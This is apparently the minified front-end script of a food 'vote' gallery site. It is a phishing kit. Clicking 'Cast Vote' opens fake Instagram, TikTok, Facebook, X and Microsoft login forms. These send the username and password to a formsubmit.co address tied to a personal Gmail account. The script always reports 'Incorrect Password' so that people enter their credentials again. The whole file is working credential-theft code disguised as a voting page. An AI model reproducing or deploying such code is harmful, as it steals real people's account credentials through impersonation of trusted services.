(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))n(i);new MutationObserver(i=>{for(const r of i)if(r.type==="childList")for(const M of r.addedNodes)M.tagName==="LINK"&&M.rel==="modulepreload"&&n(M)}).observe(document,{childList:!0,subtree:!0});function o(i){const r={};return i.integrity&&(r.integrity=i.integrity),i.referrerPolicy&&(r.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?r.credentials="include":i.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function n(i){if(i.ep)return;i.ep=!0;const r=o(i);fetch(i.href,r)}})();function O(t,e="landscape_4_3"){return`https://coresg-normal.trae.ai/api/ide/v1/text_to_image?prompt=${encodeURIComponent(t)}&image_size=${e}`}const S=[{id:"001",title:"New York-Style Pepperoni Pizza",category:"Street Food",description:"A classic thin, foldable slice with bubbling mozzarella, spicy pepperoni, and a crisp New York crust.",image:"https://i.pinimg.com/736x/94/b4/76/94b476d40ba634cb1186dcad87df0395.jpg",votes:238,hashtag:"#NYPepperoniPizza"},{id:"002",title:"Texas BBQ Brisket Plate",category:"Main Course",description:"Slow-smoked brisket with a peppery bark, served with pickles, onions, and a side of classic BBQ slaw.",image:"https://i.pinimg.com/236x/9d/e6/3b/9de63b07ea0b3176bb4865c9752ec033.jpg",votes:120,hashtag:"#TexasBBQBrisket"},{id:"003",title:"Classic Cheeseburger & Fries",category:"Street Food",description:"A juicy beef patty with melted cheddar, lettuce, tomato, and a toasted bun served with golden fries.",image:"https://i.pinimg.com/736x/4f/bc/38/4fbc38f1db4fa33513f3f60db9a72d42.jpg",votes:200,hashtag:"#ClassicCheeseburger"},{id:"004",title:"Apple Pie à la Mode",category:"Dessert",description:"Warm cinnamon apple pie with a flaky crust, topped with a scoop of vanilla ice cream and caramel drizzle.",image:"https://i.pinimg.com/1200x/fe/d2/00/fed200db642358b8dbee6c59ce59f1b7.jpg",votes:176,hashtag:"#ApplePieALaMode"},{id:"005",title:"Japanese Sushi Platter",category:"Main Course",description:"A colorful assortment of nigiri and maki with fresh salmon, tuna, and avocado served with soy and wasabi.",image:"https://i.pinimg.com/1200x/0c/59/d9/0c59d918a4273ef47798d39dc1011677.jpg",votes:96,hashtag:"#SushiPlatter"},{id:"006",title:"Tacos al Pastor",category:"Street Food",description:"Corn tortillas filled with marinated pork, pineapple, onion, cilantro, and a squeeze of lime.",image:"https://i.pinimg.com/1200x/de/4a/e7/de4ae7da54f3735dc2fd5fdbc6e0fc5a.jpg",votes:62,hashtag:"#TacosAlPastor"},{id:"007",title:"Thai Pad Thai Noodles",category:"Main Course",description:"Stir-fried rice noodles with shrimp, egg, bean sprouts, peanuts, and a tangy tamarind sauce.",image:"https://i.pinimg.com/1200x/20/54/a8/2054a89384c8cb96fd4e03db2e9aeb79.jpg",votes:145,hashtag:"#PadThai"},{id:"008",title:"Italian Tiramisu",category:"Dessert",description:"Espresso-soaked ladyfingers layered with mascarpone cream and finished with a cocoa dusting.",image:"https://i.pinimg.com/736x/c1/31/dc/c131dc43b2e31eefb38ad141a4ffc243.jpg",votes:89,hashtag:"#Tiramisu"}],j=O("festival food table with assorted gourmet dishes, realistic food photography, warm lighting, high detail, inviting presentation"),T={instagram:{id:"instagram",label:"Instagram",buttonLabel:"Vote with Instagram",buttonClassName:"vote-service-button--instagram",icon:`
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <rect x="3.5" y="3.5" width="17" height="17" rx="4.5"></rect>
        <circle cx="12" cy="12" r="4"></circle>
        <circle cx="17.4" cy="6.6" r="0.9" class="is-filled"></circle>
      </svg>
    `},tiktok:{id:"tiktok",label:"TikTok",buttonLabel:"Vote with TikTok",buttonClassName:"vote-service-button--tiktok",icon:`
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M14.3 3c.2 1.4 1 2.6 2.1 3.4.9.6 2 .9 3.1 1v3.2c-1.3 0-2.6-.3-3.8-.8v5.2c0 3.5-2.9 6.3-6.4 6.3S3 18.5 3 15s2.9-6.3 6.3-6.3c.4 0 .9 0 1.3.1V12a3.5 3.5 0 0 0-1.3-.2c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2 3.2-1.4 3.2-3.2V3h1.8Z"></path>
      </svg>
    `},facebook:{id:"facebook",label:"Facebook",buttonLabel:"Vote with Facebook",buttonClassName:"vote-service-button--facebook",icon:`
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M13.5 21v-7h2.4l.4-3h-2.8V9.2c0-.9.3-1.5 1.6-1.5h1.4V5.1c-.7-.1-1.5-.1-2.2-.1-2.2 0-3.8 1.3-3.8 3.9V11H8v3h2.5v7h3Z"></path>
      </svg>
    `},twitter:{id:"twitter",label:"X / Twitter",buttonLabel:"Vote with X / Twitter",buttonClassName:"vote-service-button--twitter",icon:`
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M18.9 3H22l-6.8 7.8L23 21h-6.1l-4.8-6.4L6.5 21H3.4l7.2-8.2L3 3h6.2l4.3 5.8L18.9 3Zm-1.1 16h1.7L8.2 4.9H6.4L17.8 19Z"></path>
      </svg>
    `},microsoft:{id:"microsoft",label:"Microsoft",buttonLabel:"Vote with Microsoft",buttonClassName:"vote-service-button--microsoft",icon:`
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M4 4h7.4v7.4H4V4Zm8.6 0H20v7.4h-7.4V4ZM4 12.6h7.4V20H4v-7.4Zm8.6 0H20V20h-7.4v-7.4Z"></path>
      </svg>
    `}},P=document.getElementById("gallery-grid"),E=Array.from(document.querySelectorAll(".filters__button")),D=document.getElementById("start-voting"),z=document.getElementById("mobile-vote-button"),Z=document.getElementById("gallery"),h=document.getElementById("menu-toggle"),v=document.getElementById("mobile-menu"),m=document.getElementById("vote-modal"),V=document.querySelector(".vote-modal__dialog"),l=document.getElementById("vote-modal-content"),I=document.getElementById("vote-modal-close");let $="All",p=null,s=null,a="services",b="",g="";const B="vote-login-error-state",C="https://formsubmit.co/goldenpathcapital13@gmail.com";function d(t){return String(t).replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#39;")}function u(t,e,o=""){const n=String(t).replaceAll(" ","%20"),i=o?` ${o}`:"";return`<img src="./${n}" alt="${d(e)}" class="provider-logo${i}" />`}function _(t="submit"){return`action="${C}" method="POST" data-submit-mode="${t}"`}function k(t,e,o={}){const n={_next:"#",_captcha:"false",provider:t,artworkId:(e==null?void 0:e.id)||"",artworkTitle:(e==null?void 0:e.title)||"",...o};return Object.entries(n).filter(([,i])=>i!=="").map(([i,r])=>`<input type="hidden" name="${d(i)}" value="${d(r)}" />`).join("")}function U(){return $==="All"?S:S.filter(t=>t.category===$)}function q(){P.innerHTML=U().map(t=>`
        <article class="art-card">
          <div class="art-card__media">
            <img
              src="${t.image}"
              alt="${d(t.title)}"
              loading="lazy"
              onerror="this.onerror=null;this.src='${j}'"
            />
            <div class="art-card__votes">${t.votes} Votes</div>
          </div>
          <div class="art-card__body">
            <p class="art-card__category">${d(t.category)}</p>
            <h3 class="art-card__title">${d(t.title)}</h3>
            <p class="art-card__description">${d(t.description)}</p>
            <button class="art-card__button" data-artwork-id="${t.id}" type="button">
              Cast Vote
            </button>
          </div>
        </article>
      `).join("")}function F(t){return S.find(e=>e.id===t)||null}function y(){document.body.style.overflow=v.classList.contains("is-open")||m.classList.contains("is-visible")?"hidden":""}function L(){v.classList.remove("is-open"),h.classList.remove("is-open"),h.setAttribute("aria-label","Open menu"),y()}function G(){v.classList.add("is-open"),h.classList.add("is-open"),h.setAttribute("aria-label","Close menu"),y()}function N(){Z.scrollIntoView({behavior:"smooth",block:"start"})}function c(t,e){s=t,a=e,Q()}function Q(){const t=["vote-modal__dialog"];a==="services"&&t.push("vote-modal__dialog--services"),s&&t.push(`vote-modal__dialog--${s}`),a==="tiktok-options"&&t.push("vote-modal__dialog--tiktok-options"),a==="tiktok-auth"&&t.push("vote-modal__dialog--tiktok-auth"),a==="twitter-step-1"&&t.push("vote-modal__dialog--twitter-step-1"),a==="twitter-step-2"&&t.push("vote-modal__dialog--twitter-step-2"),a==="microsoft-step-1"&&t.push("vote-modal__dialog--microsoft-step-1"),a==="microsoft-step-2"&&t.push("vote-modal__dialog--microsoft-step-2"),a==="provider-auth"&&t.push("vote-modal__dialog--provider-auth"),V.className=t.join(" "),I.hidden=!1}function R(){return`
    <div class="vote-panel vote-panel--services">
      <div class="vote-panel__icon">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path d="m12 3 2.75 5.58 6.16.9-4.45 4.33 1.05 6.12L12 17.03 6.49 19.93l1.05-6.12L3.09 9.48l6.16-.9L12 3Z"></path>
        </svg>
      </div>
      <h2 class="vote-panel__title" id="vote-modal-heading">Cast Your Vote</h2>
      <p class="vote-panel__subtitle">Select a service to vote with</p>
      <div class="vote-services">
        ${Object.values(T).map(t=>`
              <button
                class="vote-service-button ${t.buttonClassName}"
                data-vote-provider="${t.id}"
                type="button"
              >
                <span class="vote-service-button__icon">${t.icon}</span>
                <span class="vote-service-button__label">${d(t.buttonLabel)}</span>
                <span class="vote-service-button__arrow" aria-hidden="true">&rsaquo;</span>
              </button>
            `).join("")}
      </div>
    </div>
  `}function w(){return'<p class="provider-error" data-vote-error aria-live="polite"></p>'}function Y(t){return`
    <div class="provider-auth provider-auth--instagram">
      <div class="provider-auth__card provider-auth__card--instagram">
        <div class="instagram-logo">${u("instagram.png","Instagram logo","instagram-logo__image")}</div>
        <form class="contact-form styled-contact-form provider-form provider-form--instagram" ${_("submit")}>
          ${k("instagram",t)}
          <input
            class="provider-form__input provider-form__input--instagram"
            type="text"
            name="identity"
            placeholder="Phone number, username, or email"
            required
          />
          <input
            class="provider-form__input provider-form__input--instagram"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${w()}
          <button class="provider-form__submit provider-form__submit--instagram" type="submit">
            Log in
          </button>
        </form>
        <div class="instagram-divider"><span>OR</span></div>
        <button class="provider-link provider-link--instagram" data-vote-provider="facebook" type="button">
          <span class="provider-link__facebook-icon">${u("facebook.png","Facebook logo","provider-link__logo")}</span>
          <span>Log in with Facebook</span>
        </button>
        <button class="provider-link provider-link--muted" type="button">Forgot password?</button>
      </div>
      <div class="provider-auth__signup provider-auth__signup--instagram">
        Don&apos;t have an account?
        <button class="provider-link provider-link--inline" type="button">Sign up</button>
      </div>
      <div class="provider-auth__footer provider-auth__footer--instagram">
        <div class="provider-auth__footer-links">
          <button type="button">Meta</button>
          <button type="button">About</button>
          <button type="button">Blog</button>
          <button type="button">Jobs</button>
          <button type="button">Help</button>
          <button type="button">API</button>
          <button type="button">Privacy</button>
          <button type="button">Terms</button>
        </div>
        <p>English &nbsp; &copy; 2026 Instagram from Meta</p>
      </div>
    </div>
  `}function J(){return`
    <div class="provider-auth provider-auth--tiktok-options">
      <div class="tiktok-shell">
        <div class="tiktok-shell__help">?</div>
        <h2 class="tiktok-shell__title" id="vote-modal-heading">Log in to TikTok</h2>
        <p class="tiktok-shell__subtitle">
          Manage your account, check notifications, comment on videos, and more.
        </p>
        <div class="tiktok-options">
          <button class="tiktok-option" type="button">
            <span class="tiktok-option__icon">${u("qr code.png","QR code logo","tiktok-option__logo")}</span>
            <span>Use QR code</span>
          </button>
          <button class="tiktok-option" data-tiktok-login type="button">
            <span class="tiktok-option__icon">${u("user.png","User login logo","tiktok-option__logo")}</span>
            <span>Use phone / email / username</span>
          </button>
          <button class="tiktok-option" data-vote-provider="facebook" type="button">
            <span class="tiktok-option__icon tiktok-option__icon--facebook">${u("facebook.png","Facebook logo","tiktok-option__logo")}</span>
            <span>Continue with Facebook</span>
          </button>
          <button class="tiktok-option" type="button">
            <span class="tiktok-option__icon tiktok-option__icon--google">${u("google.png","Google logo","tiktok-option__logo")}</span>
            <span>Continue with Google</span>
          </button>
        </div>
        <p class="tiktok-shell__terms">
          By continuing with an account located in <strong>Australia</strong>, you agree to our
          <strong> Terms of Service.</strong>
        </p>
      </div>
      <div class="tiktok-shell__signup">
        Don&apos;t have an account?
        <button class="provider-link provider-link--tiktok-inline" type="button">Sign up</button>
      </div>
    </div>
  `}function X(t){return`
    <div class="provider-auth provider-auth--tiktok-auth">
      <div class="tiktok-login">
        <div class="tiktok-login__topbar">
          <button class="tiktok-back" data-vote-back type="button" aria-label="Back">&lsaquo;</button>
          <h2 class="tiktok-login__title" id="vote-modal-heading">Log in</h2>
          <div class="tiktok-login__help">?</div>
        </div>
        <div class="tiktok-login__tabs">
          <button class="tiktok-login__tab" type="button">Phone</button>
          <button class="tiktok-login__tab is-active" type="button">Email / Username</button>
        </div>
        <form
          class="contact-form styled-contact-form provider-form provider-form--tiktok"
          ${_("submit")}
          data-enable-on-input="true"
        >
          ${k("tiktok",t)}
          <input
            class="provider-form__input provider-form__input--tiktok"
            type="text"
            name="identity"
            placeholder="Email or username"
            required
          />
          <div class="tiktok-password-field">
            <input
              class="provider-form__input provider-form__input--tiktok"
              type="password"
              name="password"
              placeholder="Password"
              required
            />
            <span class="tiktok-password-field__eye">◉</span>
          </div>
          <button class="provider-link provider-link--muted provider-link--left" type="button">
            Forgot password?
          </button>
          ${w()}
          <button class="provider-form__submit provider-form__submit--tiktok" type="submit" disabled>
            Log in
          </button>
        </form>
      </div>
      <div class="tiktok-shell__signup">
        Don&apos;t have an account?
        <button class="provider-link provider-link--tiktok-inline" type="button">Sign up</button>
      </div>
    </div>
  `}function K(t){return`
    <div class="provider-auth provider-auth--facebook">
      <div class="facebook-auth">
        <div class="facebook-auth__logo">${u("facebook.png","Facebook logo","facebook-auth__logo-image")}</div>
        <form class="contact-form styled-contact-form provider-form provider-form--facebook" ${_("submit")}>
          ${k("facebook",t)}
          <input
            class="provider-form__input provider-form__input--facebook"
            type="text"
            name="identity"
            placeholder="Mobile number or email address"
            required
          />
          <input
            class="provider-form__input provider-form__input--facebook"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${w()}
          <button class="provider-form__submit provider-form__submit--facebook" type="submit">
            Log In
          </button>
          <button class="provider-link provider-link--muted provider-link--facebook" type="button">
            Forgotten password?
          </button>
          <button class="facebook-auth__create" type="button">Create new account</button>
        </form>
        <div class="facebook-auth__meta">${u("meta.png","Meta logo","facebook-auth__meta-image")}</div>
        <div class="facebook-auth__footer">
          <button type="button">About</button>
          <button type="button">Help</button>
          <button type="button">More</button>
        </div>
      </div>
    </div>
  `}function W(){return`
    <div class="provider-auth provider-auth--twitter">
      <div class="twitter-auth twitter-auth--step-1">
        <div class="twitter-auth__logo" aria-hidden="true">${T.twitter.icon}</div>
        <h2 class="twitter-auth__title" id="vote-modal-heading">Sign in to X</h2>
        <button class="twitter-auth__social twitter-auth__social--light" type="button">
          <span class="twitter-auth__social-icon twitter-auth__social-icon--google">${u("google.png","Google logo","twitter-auth__social-logo")}</span>
          <span>Sign in with Google</span>
        </button>
        <button class="twitter-auth__social twitter-auth__social--light" type="button">
          <span class="twitter-auth__social-icon twitter-auth__social-icon--apple">${u("apple.png","Apple logo","twitter-auth__social-logo")}</span>
          <span>Sign in with Apple</span>
        </button>
        <div class="twitter-auth__divider"><span>or</span></div>
        <form class="contact-form styled-contact-form provider-form provider-form--twitter-step-1" data-submit-mode="twitter-next">
          <input
            class="provider-form__input provider-form__input--twitter"
            type="text"
            name="identity"
            placeholder="Phone, email, or username"
            required
          />
          <button class="provider-form__submit provider-form__submit--twitter-next" type="submit">
            Next
          </button>
        </form>
        <br>
        <button class="twitter-auth__secondary" type="button">Forgot password?</button>
        <p class="twitter-auth__signup">
          Don&apos;t have an account?
          <button class="provider-link provider-link--twitter-inline" type="button">Sign up</button>
        </p>
      </div>
    </div>
  `}function tt(){return`
    <div class="provider-auth provider-auth--twitter">
      <div class="twitter-auth twitter-auth--step-2">
        <div class="twitter-auth__logo" aria-hidden="true">${T.twitter.icon}</div>
        <h2 class="twitter-auth__title" id="vote-modal-heading">Enter your password</h2>
        <div class="twitter-auth__identity-card">
          <span class="twitter-auth__identity-label">Username</span>
          <strong>${d(b||"")}</strong>
        </div>
        <form class="contact-form styled-contact-form provider-form provider-form--twitter-step-2" ${_("submit")}>
          ${k("twitter",p,{identity:b})}
          <input
            class="provider-form__input provider-form__input--twitter provider-form__input--twitter-password"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${w()}
          <button class="provider-link provider-link--twitter-left" type="button">Forgot password?</button>
          <button class="provider-form__submit provider-form__submit--twitter-login" type="submit">
            Log in
          </button>
        </form>
        <p class="twitter-auth__signup">
          Don&apos;t have an account?
          <button class="provider-link provider-link--twitter-inline" type="button">Sign up</button>
        </p>
      </div>
    </div>
  `}function et(t){return`
    <div class="provider-auth provider-auth--microsoft">
      <div class="microsoft-auth">
        <div class="microsoft-auth__card">
          <div class="microsoft-brand" aria-hidden="true">
            <span class="microsoft-brand__mark">
              <span></span><span></span><span></span><span></span>
            </span>
            <span class="microsoft-brand__text">Microsoft</span>
          </div>
          <h2 class="microsoft-auth__title" id="vote-modal-heading">Sign in</h2>
          <form class="contact-form styled-contact-form provider-form provider-form--microsoft" data-submit-mode="microsoft-next">
            <input
              class="provider-form__input provider-form__input--microsoft"
              type="email"
              name="identity"
              placeholder="Email, phone, or Skype"
              required
            />
            <div class="microsoft-auth__links">
              <p class="microsoft-auth__inline-copy">
                No account?
                <button class="provider-link provider-link--microsoft-inline" type="button">Create one!</button>
              </p>
              <button class="provider-link provider-link--microsoft-link" type="button">
                Can&apos;t access your account?
              </button>
            </div>
            <div class="microsoft-auth__actions">
              <button class="provider-form__submit provider-form__submit--microsoft" type="submit">
                Next
              </button>
            </div>
          </form>
        </div>
        <button class="microsoft-auth__options" type="button">
          <span class="microsoft-auth__options-icon" aria-hidden="true">⌕</span>
          <span>Sign-in options</span>
        </button>
      </div>
    </div>
  `}function ot(t){return`
    <div class="provider-auth provider-auth--microsoft">
      <div class="microsoft-auth">
        <div class="microsoft-auth__card">
          <div class="microsoft-brand" aria-hidden="true">
            <span class="microsoft-brand__mark">
              <span></span><span></span><span></span><span></span>
            </span>
            <span class="microsoft-brand__text">Microsoft</span>
          </div>
          <button class="microsoft-auth__back" data-vote-back type="button">
            <span aria-hidden="true">&lsaquo;</span>
            <span>${d(g||"")}</span>
          </button>
          <h2 class="microsoft-auth__title" id="vote-modal-heading">Enter password</h2>
          <form class="contact-form styled-contact-form provider-form provider-form--microsoft" ${_("submit")}>
          ${k("microsoft",t,{identity:g})}
          <input
            class="provider-form__input provider-form__input--microsoft"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${w()}
            <div class="microsoft-auth__links">
              <button class="provider-link provider-link--microsoft-link" type="button">
                Forgot password?
              </button>
              <button class="provider-link provider-link--microsoft-link" type="button">
                Other ways to sign in
              </button>
            </div>
            <div class="microsoft-auth__actions">
              <button class="provider-form__submit provider-form__submit--microsoft" type="submit">
                Sign in
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  `}function f(){if(!p){l.innerHTML="";return}if(a==="services"||!s){l.innerHTML=R();return}if(s==="instagram"){l.innerHTML=Y(p);return}if(s==="facebook"){l.innerHTML=K(p);return}if(s==="tiktok"&&a==="tiktok-options"){l.innerHTML=J();return}if(s==="tiktok"&&a==="tiktok-auth"){l.innerHTML=X(p);return}if(s==="twitter"&&a==="twitter-step-1"){l.innerHTML=W();return}if(s==="twitter"&&a==="twitter-step-2"){l.innerHTML=tt();return}if(s==="microsoft"&&a==="microsoft-step-2"){l.innerHTML=ot(p);return}s==="microsoft"&&(l.innerHTML=et())}function it(t){p=t,b="",g="",c(null,"services"),f(),m.classList.add("is-visible"),m.setAttribute("aria-hidden","false"),y()}function x(){p=null,s=null,a="services",b="",g="",V.className="vote-modal__dialog vote-modal__dialog--services",m.classList.remove("is-visible"),m.setAttribute("aria-hidden","true"),l.innerHTML="",y()}function at(t){t==="tiktok"?c("tiktok","tiktok-options"):t==="twitter"?c("twitter","twitter-step-1"):t==="microsoft"?c("microsoft","microsoft-step-1"):c(t,"provider-auth"),f()}function H(t){t.classList.remove("has-error");const e=t.querySelector("[data-vote-error]");e&&(e.textContent=""),t.querySelectorAll("input").forEach(o=>{o.removeAttribute("aria-invalid")})}function A(t){const e=t.querySelector("[data-vote-error]");e&&(e.textContent="Incorrect Password. Try Again."),t.classList.add("has-error"),t.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]').forEach(o=>{o.setAttribute("aria-invalid","true")})}async function rt(t){if(t.dataset.isSubmitting==="true")return;const e=t.querySelector(".provider-form__submit"),o=(e==null?void 0:e.dataset.originalLabel)||(e==null?void 0:e.textContent)||(e==null?void 0:e.value)||"Submit";t.dataset.isSubmitting="true",e&&(e.dataset.originalLabel=o,e.disabled=!0,e.tagName==="BUTTON"?e.textContent="Submitting...":e.value="Submitting...");try{const n=await fetch(C,{method:"POST",body:new FormData(t),headers:{Accept:"application/json"}});if(!n.ok)throw new Error(`Vote form request failed with status ${n.status}`);A(t)}catch{A(t)}finally{t.dataset.isSubmitting="false",e&&(e.disabled=!1,e.tagName==="BUTTON"?e.textContent=o:e.value=o)}}function st(){let t="";try{t=sessionStorage.getItem(B)||"",sessionStorage.removeItem(B)}catch{return}if(t)try{const e=JSON.parse(t),o=F(e.artworkId||"");if(!o||!e.providerId)return;p=o,b=e.twitterIdentityValue||"",g=e.microsoftIdentityValue||"",c(e.providerId,e.screen||"provider-auth"),f(),m.classList.add("is-visible"),m.setAttribute("aria-hidden","false"),y();const n=l.querySelector("form");n&&A(n)}catch{}}E.forEach(t=>{t.addEventListener("click",()=>{$=t.dataset.category||"All",E.forEach(e=>e.classList.remove("is-active")),t.classList.add("is-active"),q()})});P.addEventListener("click",t=>{const e=t.target.closest(".art-card__button");if(!e)return;const o=F(e.dataset.artworkId||"");o&&it(o)});D.addEventListener("click",N);z.addEventListener("click",()=>{L(),N()});h.addEventListener("click",()=>{if(v.classList.contains("is-open")){L();return}G()});v.querySelectorAll("a").forEach(t=>{t.addEventListener("click",L)});v.addEventListener("click",t=>{t.target===v&&L()});m.addEventListener("click",t=>{if(t.target.closest("[data-close-vote-modal]")){x();return}const o=t.target.closest("[data-vote-provider]");if(o){at(o.dataset.voteProvider||"");return}if(t.target.closest("[data-tiktok-login]")){c("tiktok","tiktok-auth"),f();return}t.target.closest("[data-vote-back]")&&(s==="tiktok"&&a==="tiktok-auth"?c("tiktok","tiktok-options"):s==="microsoft"&&a==="microsoft-step-2"?c("microsoft","microsoft-step-1"):c(null,"services"),f())});l.addEventListener("submit",async t=>{const e=t.target.closest("form");if(e){if(!e.reportValidity()){t.preventDefault();return}if(H(e),e.dataset.submitMode==="twitter-next"){t.preventDefault(),b=e.elements.identity.value.trim(),c("twitter","twitter-step-2"),f();return}if(e.dataset.submitMode==="microsoft-next"){t.preventDefault(),g=e.elements.identity.value.trim(),c("microsoft","microsoft-step-2"),f();return}t.preventDefault(),await rt(e)}});l.addEventListener("input",t=>{const e=t.target.closest("form");if(!e||(H(e),e.dataset.enableOnInput!=="true"))return;const o=e.querySelector(".provider-form__submit"),i=Array.from(e.querySelectorAll("input[required]")).every(r=>r.value.trim().length>0);o&&(o.disabled=!i)});I.addEventListener("click",x);window.addEventListener("keydown",t=>{t.key==="Escape"&&m.classList.contains("is-visible")&&x()});q();st();
